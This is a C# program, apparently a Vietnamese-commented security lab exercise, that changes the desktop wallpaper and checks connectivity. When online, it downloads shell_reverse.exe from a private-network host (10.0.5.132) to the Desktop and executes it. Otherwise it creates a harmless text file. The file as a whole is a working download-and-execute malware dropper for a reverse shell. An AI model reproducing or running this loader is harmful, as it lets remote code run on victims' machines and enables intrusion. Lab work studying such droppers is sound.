using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.NetworkInformation;
using System.Net;

namespace Lab2_Task1._3
{
    class Program
    {
        //Sử dụng file user32.dll
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        //Sử dụng hàm SystemParamertersInfo trong user32.dll
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        //Khai báo các giá trị để set Wallpaper
        const int SPI_SETDESKWALLPAPER = 0x14;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;
        //Hàm thay đổi hình nền sử dụng các giá trị và hàm được sử dụng ở trên
        static public void SetWallpaper(String filename)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filename, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        //Hàm kiểm tra kết nối
        static public bool CheckConnection()
        {
            Ping ping = new Ping();
            PingReply reply = ping.Send("8.8.8.8", 2000);
            if (reply.Status == IPStatus.Success)
                return true;
            return false;
        }
        //Hàm tải và thực thi file shell_reverse.exe
        static public void ReverseShell()
        {
            string folderpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (var client = new WebClient())
            {
                try
                {
                    client.DownloadFile("http://10.0.5.132/shell_reverse.exe", folderpath + "\\shell_reverse.exe");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.StackTrace);
                    return;
                }
            }

            // Thực thi file shell_reverse.exe
            System.Diagnostics.Process.Start(folderpath + "\\shell_reverse.exe");
        }
        //Hàm tạo file test.txt có nội dung là Hello World
        static public void FileCreate()
        {
            string folderpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            // Create file
            FileStream stream = new FileStream((folderpath + "\\test.txt"), FileMode.OpenOrCreate);
            StreamWriter writer = new StreamWriter(stream);

            // Write file
            writer.Write("Hello World");

            writer.Close();
            stream.Close();
        }
        //Hàm main
        static void Main(string[] args)
        {
            //Đường dẫn của file hình muốn đổi
            //Tất cả các file tải về và file hình để ở ngoài Desktop cho thuận tiện trong việc theo dõi code
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\img.jpg";
            SetWallpaper(filepath);
            bool internetStatus = CheckConnection();
            //Kiểm tra kết nối internet, nếu có thì reverse_shell còn nếu không sẽ tạo file
            if (internetStatus)
                ReverseShell();
            else
                FileCreate();
        }
    }
}
